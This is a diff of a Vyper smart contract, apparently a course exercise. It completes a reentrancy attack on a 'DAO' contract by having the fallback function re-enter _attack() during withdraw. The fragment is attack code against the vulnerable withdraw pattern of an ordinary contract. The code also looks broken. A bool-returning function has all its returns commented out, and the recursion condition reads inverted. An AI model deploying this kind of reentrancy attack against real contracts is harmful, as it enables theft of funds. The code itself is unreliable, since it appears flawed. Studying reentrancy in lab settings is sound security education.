@@ -20,10 +20,10 @@ def _attack() -> bool:
     
     DAO(self.dao_address).withdraw()
     
-    if (DAO(self.dao_address).userBalances(self.dao_address) < 10000):
-        return False
-    else:
-        return True
+    #if (DAO(self.dao_address).userBalances(self.dao_address) < 10000):
+    #    return False
+    #else:
+    #    return True
 
 @external
 @payable
@@ -54,6 +54,6 @@ def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     
     # TODO: Add code here to complete the recursive call
-    DAO(msg.sender).deposit(value = msg.value)
-   
-    pass
+    if (DAO(self.dao_address).userBalances(self.dao_address) < 10000):
+        self._attack()
+    
